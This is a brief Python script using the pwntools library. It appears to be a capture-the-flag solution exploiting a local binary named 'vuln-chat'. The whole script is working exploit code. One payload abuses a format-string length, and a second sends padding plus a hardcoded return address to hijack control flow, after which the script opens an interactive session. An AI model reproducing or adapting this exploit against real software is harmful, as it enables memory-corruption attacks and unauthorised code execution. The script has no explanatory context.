import pwn
import struct
import sys

payload1 = b"A" * 20 + b"%60s"
payload2 = b"A" * 49 + b"\x6b\x85\x04\x08"

io = pwn.process("./vuln-chat")
io.sendline(payload1)
io.sendline(payload2)
io.interactive()

